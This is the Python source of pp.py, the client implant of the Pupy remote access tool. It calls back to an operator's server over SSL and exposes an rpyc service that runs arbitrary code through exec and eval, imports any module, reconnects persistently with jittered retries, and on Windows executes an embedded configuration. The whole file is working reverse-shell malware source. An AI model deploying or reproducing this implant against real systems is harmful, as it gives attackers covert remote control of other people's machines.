#!/usr/bin/env python
# -*- coding: UTF8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------
import site
import sys
import time
import rpyc
from rpyc.core.service import Service, ModuleNamespace
from rpyc.lib.compat import execute, is_py3k
import rpyc.core.stream
import rpyc.utils.factory
import threading
import weakref
import traceback
import os
import subprocess
import threading
import multiprocessing
import StringIO
import json
import urllib2
import urllib
import platform
import re
import ssl
import random
import imp
import argparse
from network import conf
from network.base_launcher import LauncherError
import logging
import shlex
logging.getLogger().setLevel(logging.INFO)

LAUNCHER="simple" # the default launcher to start when no argv
LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport tcp_ssl") # default launcher arguments


class ReverseSlaveService(Service):
	""" Pupy reverse shell rpyc service """
	__slots__=["exposed_namespace"]
	def on_connect(self):
		self.exposed_namespace = {}
		self._conn._config.update(dict(
			allow_all_attrs = True,
			allow_public_attrs = True,
			allow_pickle = True,
			allow_getattr = True,
			allow_setattr = True,
			allow_delattr = True,
			import_custom_exceptions = False,
			propagate_SystemExit_locally=True,
			propagate_KeyboardInterrupt_locally=True,
			instantiate_custom_exceptions = True,
			instantiate_oldstyle_exceptions = True,
		))
		# shortcuts
		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))

	def on_disconnect(self):
		print "disconnecting !"
		raise KeyboardInterrupt

	def exposed_exit(self):
		raise SystemExit

	def exposed_execute(self, text):
		"""execute arbitrary code (using ``exec``)"""
		execute(text, self.exposed_namespace)

	def exposed_get_infos(self, s):
		"""execute arbitrary code (using ``exec``)"""
		import pupy
		if not s in pupy.infos:
			return None
		return pupy.infos[s]


	def exposed_eval(self, text):
		"""evaluate arbitrary code (using ``eval``)"""
		return eval(text, self.exposed_namespace)
	def exposed_getmodule(self, name):
		"""imports an arbitrary module"""
		return __import__(name, None, None, "*")
	def exposed_getconn(self):
		"""returns the local connection instance to the other side"""
		return self._conn

def get_next_wait(attempt):
	if attempt<60:
		return random.randint(5,10)/10.0
	elif attempt<100:
		return random.randint(30,50)/10.0
	else:
		return random.randint(150,300)/10.0

	
def add_pseudo_pupy_module(HOST):
	""" add a pseudo pupy module for *nix payloads """
	if not "pupy" in sys.modules:
		mod = imp.new_module("pupy")
		mod.__name__="pupy"
		mod.__file__="<memimport>\\\\pupy"
		mod.__package__="pupy"
		sys.modules["pupy"]=mod
		mod.get_connect_back_host=(lambda : HOST)
		mod.pseudo=True

def main():
	global LAUNCHER
	global LAUNCHER_ARGS

	if len(sys.argv)>1:
		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
		parser.add_argument('launcher', choices=[x for x in conf.launchers], help="the launcher to use")
		parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher arguments")
		args=parser.parse_args()
		LAUNCHER=args.launcher
		LAUNCHER_ARGS=shlex.split(' '.join(args.launcher_args))

	if not LAUNCHER in conf.launchers:
		exit("No such launcher: %s"%LAUNCHER)

	if "windows" in platform.system().lower():
		try:
			import pupy
			config_file=pupy.get_pupy_config()
			exec config_file in globals()
		except ImportError:
			logging.warning("ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")

	launcher=conf.launchers[LAUNCHER]()
	try:
		launcher.parse_args(LAUNCHER_ARGS)
	except LauncherError as e:
		launcher.arg_parser.print_usage()
		exit(str(e))

	if "pupy" not in sys.modules:
		add_pseudo_pupy_module(launcher.get_host())
	else:
		pupy.get_connect_back_host=launcher.get_host

	import pupy
	pupy.infos={} #global dictionary to store informations persistent through a deconnection
	pupy.infos['launcher']=LAUNCHER
	pupy.infos['launcher_args']=LAUNCHER_ARGS
		
	attempt=0
	while True:
		try:
			for stream in launcher.iterate():
				try:
					def check_timeout(event, cb, timeout=10):
						start_time=time.time()
						while True:
							if time.time()-start_time>timeout:
								if not event.is_set():
									logging.error("timeout occured !")
									cb()
								break
							elif event.is_set():
								break
							time.sleep(0.5)
					event=threading.Event()
					t=threading.Thread(target=check_timeout, args=(event, stream.close))
					t.daemon=True
					t.start()
					try:
						conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
					finally:
						event.set()
					while True:
						attempt=0
						conn.serve()
				except KeyboardInterrupt:
					raise
				except EOFError:
					raise
				except SystemExit:
					raise
				except Exception as e:
					logging.error(e)
					
		except EOFError:
			print "EOF received. exiting."
			break
		except KeyboardInterrupt:
			if not getattr(sys, 'frozen', False):
				print ""
				break
			else:
				print "keyboard interrupt raised, restarting the connection"
		except SystemExit as e:
			logging.error(e)
			break
		except Exception as e:
			logging.error(e)
		finally:
			time.sleep(get_next_wait(attempt))
			attempt+=1

if __name__=="__main__":
	main()

